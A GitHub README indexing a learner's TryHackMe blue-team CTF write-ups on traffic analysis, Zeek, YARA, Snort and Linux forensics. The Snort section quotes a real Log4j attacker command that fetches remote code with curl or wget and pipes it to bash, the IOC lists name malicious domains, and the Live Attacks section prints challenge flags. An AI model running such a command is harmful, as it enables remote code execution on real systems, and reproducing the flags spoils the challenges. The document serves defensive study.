# TryHackMe Blue Team CTF - Complete Writeups

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Blue%20Team-blue)](https://tryhackme.com)
[![CTF](https://img.shields.io/badge/CTF-Network%20Analysis-green)](https://github.com/samli-neo/tryhackme-blueteam-ctf)
[![Completed](https://img.shields.io/badge/Status-100%25%20Complete-success)](https://github.com/samli-neo/tryhackme-blueteam-ctf)

Complete collection of writeups and analyses for TryHackMe Blue Team challenges, focusing on network traffic analysis, malware detection, and incident response.

---

## 📚 Available CTFs

### 🎯 C2 Carnage - Network Traffic Analysis
**Difficulty**: Medium | **Score**: 20/20 (100%) | **Points**: 600

In-depth analysis of a multi-stage infection involving Squirrelwaffle, Qakbot, and Cobalt Strike. Complete investigation of malicious network traffic with IOC extraction.

[📖 View complete writeup →](./c2carnage/)

**Skills demonstrated**:
- ✅ Network traffic analysis (Wireshark/tshark)
- ✅ Multi-stage malware identification
- ✅ Protocol investigation (HTTP, HTTPS, DNS, SMTP)
- ✅ SSL/TLS certificate analysis
- ✅ IOC extraction and correlation
- ✅ Bash scripting for automation

**Identified infection chain**:
```
Malicious Email → Word Macros → Squirrelwaffle
    ↓
    ├─→ Qakbot (maldivehost.net)
    └─→ Cobalt Strike (survmeter.live + securitybusinpuff.com)
```

**Critical IOCs**:
- 7 malicious domains
- 4 C2 IP addresses
- 2 malicious files
- 1439 malspam SMTP packets

---

### 🔍 Zeek Exercises - Network Security Monitoring
**Difficulty**: Medium | **Score**: 14/14 (100%)

Hands-on practice with Zeek (formerly Bro) network security monitoring tool covering DNS tunneling detection, phishing investigation, and Log4J exploitation analysis.

[📖 View complete writeup →](./zeek-exercises/)

**Skills demonstrated**:
- ✅ Zeek log analysis and investigation
- ✅ DNS tunneling detection
- ✅ Phishing campaign investigation
- ✅ Malware analysis with VirusTotal
- ✅ Log4J exploitation detection (CVE-2021-44228)
- ✅ Base64 payload decoding
- ✅ IOC extraction and defanging

**Identified attack chains**:
```
DNS Tunneling: 10.20.57.3 → 320 IPv6 queries → Data exfiltration
Phishing: Email → VBA Macros → smart-fax.com → C2 (hopto.org)
Log4Shell: Nmap → JNDI Injection → LDAP .class → RCE (pwned)
```

**Critical IOCs**:
- 3 attack scenarios analyzed
- 5 Zeek log types examined
- 3 PCAPs investigated
- DNS tunneling, phishing, and Log4J exploitation

---

### 🔐 YARA Rules - YARA mean one!
**Difficulty**: Medium | **Score**: 3/3 (100%) | **Points**: 24 | **Event**: Advent of Cyber 2025 - Day 13

Learn how YARA rules can be used to detect anomalies and malicious patterns. Create YARA rules with regex to extract hidden messages from Easter preparation images and locate McSkidy.

[📖 View complete writeup →](./yara-rules/)

**Skills demonstrated**:
- ✅ YARA rule syntax and structure (meta, strings, conditions)
- ✅ Regular expression pattern matching
- ✅ String type mastery (text, hex, regex)
- ✅ YARA modifiers (nocase, wide, ascii, xor, base64)
- ✅ Recursive directory scanning with YARA
- ✅ Hidden message extraction and decoding

**Challenge solved**:
```
5 Images with "TBFC:<code>" Patterns
         ↓
YARA Rule: /TBFC:[A-Za-z0-9]+/
         ↓
Code Word Extraction
         ↓
Message Decoded: "Find me in HopSec Island"
```

**Key concepts**:
- YARA rule architecture and components
- Pattern matching for malware detection
- Real-world use cases (IcedID trojan detection)
- Defensive applications in SOC operations

---

### 🐧 Linux CLI - Shells Bells
**Difficulty**: Easy | **Score**: 9/9 (100%) | **Event**: Advent of Cyber 2025 - Day 1

Explore the Linux command-line interface to investigate McSkidy's kidnapping and uncover the "Eggstrike" malware attack by Sir Carrotbane. Master essential Linux commands while analyzing logs, finding hidden files, and performing bash history forensics.

[📖 View complete writeup →](./linux-cli/)

**Skills demonstrated**:
- ✅ Linux CLI fundamentals (ls, cat, cd, pwd, grep, find)
- ✅ Hidden file discovery with dotfiles
- ✅ Log analysis for failed login attempts
- ✅ Shell script malware analysis
- ✅ Privilege escalation with sudo su
- ✅ Bash history forensics
- ✅ Linux special symbols (|, >, >>, &&)

**Attack chain discovered**:
```
HopSec Island Brute Force Attack
         ↓
Root Compromise on SOC-mas Server
         ↓
Eggstrike Malware Deployment
         ↓
Christmas Wishlist Theft & Replacement
         ↓
Data Exfiltration to files.hopsec.thm
         ↓
Message: "THM{until-we-meet-again}"
```

**Critical findings**:
- 4 malicious HopSec domains
- 3 flags discovered
- 1 malware script (eggstrike.sh)
- Wishlist data exfiltration detected

---

### 🚨 Snort Challenge - The Basics
**Difficulty**: Medium | **Score**: 40/40 (100%) | **Points**: 600

Put your Snort skills into practice and write Snort rules to analyse live capture network traffic. Master IDS rule writing for multiple protocols and troubleshoot syntax errors.

[📖 View complete writeup →](./snort-challenge-basics/)

**Skills demonstrated**:
- ✅ Snort IDS rule writing (HTTP, FTP, PNG, Torrent)
- ✅ Network traffic analysis with tshark
- ✅ Rule syntax troubleshooting
- ✅ External rule implementation (MS17-010, Log4j)
- ✅ PCAP analysis and packet inspection
- ✅ Vulnerability detection (CVSS 9.3)

**Key findings**:
```
HTTP: 164 packets on port 80
FTP: 307 packets, 41 failed logins
MS17-010: 25,154 packets, IPC$ path detected
Log4j: Base64 RCE payload, CVSS 9.3
```

**Critical vulnerabilities detected**:
- MS17-010 (EternalBlue): \\192.168.116.138\IPC$
- Log4j (CVE-2021-44228): Remote code execution
- Attacker command: `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`

---

### 🛡️ Snort Challenge - Live Attacks
**Difficulty**: Medium | **Score**: 6/6 (100%)

Put your Snort skills into practice and defend against live attacks using Snort IPS mode. Block SSH brute-force and reverse shell attacks in real-time.

[📖 View complete writeup →](./snort-challenge-live-attacks/)

**Skills demonstrated**:
- ✅ Snort IPS active defense deployment
- ✅ Real-time threat detection and mitigation
- ✅ SSH brute-force attack blocking
- ✅ Reverse shell connection prevention
- ✅ Bidirectional traffic monitoring
- ✅ Incident response procedures

**Attacks blocked**:
```
Scenario 1: SSH Brute-Force (TCP/22)
Scenario 2: Reverse Shell (TCP/4444 - Metasploit)
```

**Flags captured**:
- SSH Brute-Force: THM{81b7fef657f8aaa6e4e200d616738254}
- Reverse Shell: THM{0ead8c494861079b1b74ec2380d2cd24}

---

## 🛠️ Tools and Technologies

- **Wireshark/tshark** - PCAP analysis
- **Zeek (Bro)** - Network security monitoring
- **Snort** - Intrusion Detection/Prevention System
- **VirusTotal** - Malware analysis
- **Bash scripting** - Automation
- **Python** - Data processing
- **Git** - Version control
- **Markdown** - Documentation

---

## 📁 Repository Structure

```
tryhackme-blueteam-ctf/
├── README.md                  # This file
│
├── c2carnage/                 # C2 Carnage CTF
│   ├── README.md              # Overview
│   ├── writeup.md             # Detailed technical writeup
│   ├── SUMMARY.md             # Executive summary with IOCs
│   ├── COMPLETION.md          # Completion document
│   ├── INDEX.md               # Navigation guide
│   ├── scripts/               # Analysis scripts
│   │   ├── complete_analysis.sh
│   │   ├── analyze_pcap.sh
│   │   └── analyze_c2.sh
│   ├── screenshots/           # Screenshots
│   └── notes/                 # Analysis notes
│
├── zeek-exercises/            # Zeek Exercises CTF
│   ├── README.md              # Overview
│   ├── writeup.md             # Detailed technical writeup
│   ├── SUMMARY.md             # Executive summary
│   ├── COMPLETION.md          # Completion certificate
│   ├── scripts/               # Analysis scripts
│   ├── screenshots/           # Screenshots
│   └── notes/                 # Investigation notes
│
├── yara-rules/                # YARA Rules CTF
│   ├── README.md              # Overview
│   ├── SUMMARY.md             # Executive summary
│   ├── COMPLETION.md          # Completion certificate
│   ├── scripts/               # Analysis scripts
│   └── screenshots/           # Evidence screenshots
│
├── linux-cli/                 # Linux CLI - Shells Bells
│   ├── README.md              # Overview
│   ├── SUMMARY.md             # Executive summary
│   ├── COMPLETION.md          # Completion certificate
│   └── screenshots/           # Evidence screenshots
│
├── snort-challenge-basics/    # Snort Challenge - The Basics
│   ├── README.md              # Overview
│   └── SUMMARY.md             # Executive summary
│
└── snort-challenge-live-attacks/  # Snort Challenge - Live Attacks
    ├── README.md              # Overview
    └── SUMMARY.md             # Executive summary
```

---

## 🚀 Usage

### Viewing Writeups

```bash
# Clone the repository
git clone https://github.com/samli-neo/tryhackme-blueteam-ctf.git
cd tryhackme-blueteam-ctf

# View a specific CTF
cd c2carnage
cat README.md

# View Zeek Exercises
cd zeek-exercises
cat README.md
```

### Using Analysis Scripts

```bash
# Analyze a similar PCAP with tshark
cd c2carnage/scripts
./complete_analysis.sh /path/to/your.pcap

# Analyze with Zeek
cd zeek-exercises
zeek -C -r /path/to/your.pcap
cat dns.log | zeek-cut query qtype_name
```

---

## 📊 Global Statistics

| Metric | Value |
|--------|-------|
| CTFs completed | 6 |
| Average success rate | 100% |
| Total questions | 89 |
| Questions answered | 89 |
| Documentation pages | 200+ |
| PCAPs analyzed | 6+ |
| Attack chains identified | 10 |
| Attacks blocked (live) | 2 |

---

## 🎓 Learning Objectives

This repository demonstrates the following skills:

### Forensic Analysis
- Malicious network traffic investigation
- Attack pattern identification
- Infection timeline reconstruction
- Indicators of compromise (IOCs) extraction
- DNS tunneling detection

### Blue Team Operations
- Malware detection with VirusTotal
- Network protocol analysis (HTTP, HTTPS, DNS, SMTP)
- Event correlation across multiple log sources
- Incident response and threat hunting
- Network security monitoring with Zeek
- Log4J vulnerability exploitation analysis

### Technical Documentation
- Structured and detailed writeups
- Reusable and commented scripts
- Reproducible methodology
- Knowledge sharing
- IOC defanging and responsible disclosure

---

## ⚠️ Disclaimer

**WARNING**: The IOCs and malware samples mentioned in these writeups are real and dangerous. This repository is for educational purposes only.

- ❌ **DO NOT** interact with the listed malicious domains or IPs
- ❌ **DO NOT** execute malware samples
- ✅ **USE** only in an isolated and secure environment
- ✅ **RESPECT** local laws and regulations

---

## 📝 License and Credits

### Author
**Salim Hadda**
- GitHub: [@samli-neo](https://github.com/samli-neo)
- TryHackMe: Active learner

### Sources
- **TryHackMe** - CTF platform
- **Brad Duncan (malware-traffic-analysis.net)** - PCAP samples
- **Blue Team Community** - Knowledge sharing

### License
This repository is provided "as is" for educational purposes. Writeups and analyses are original and can be freely used with attribution.

---

## 🔄 Updates

- **2025-12-26**: Added Snort Challenge - Live Attacks - 100% completed
- **2025-12-26**: Added Snort Challenge - The Basics - 100% completed
- **2025-12-25**: Added Linux CLI CTF (Advent of Cyber 2025 Day 1) - 100% completed
- **2025-12-25**: Added YARA Rules CTF (Advent of Cyber 2025 Day 13) - 100% completed
- **2025-12-25**: Added Zeek Exercises CTF - 100% completed
- **2025-12-24**: Added C2 Carnage CTF - 100% completed
- Repository created and initial documentation

---

## 🤝 Contribution

This repository documents my learning journey on TryHackMe. Suggestions and feedback are welcome via GitHub Issues.

---

## 📞 Contact

For questions or discussions about analysis techniques:
- Open a GitHub Issue
- Consult the detailed writeups in each CTF folder

---

**Happy Hacking & Stay Blue Team! 🛡️**

*Last updated: 2025-12-25*
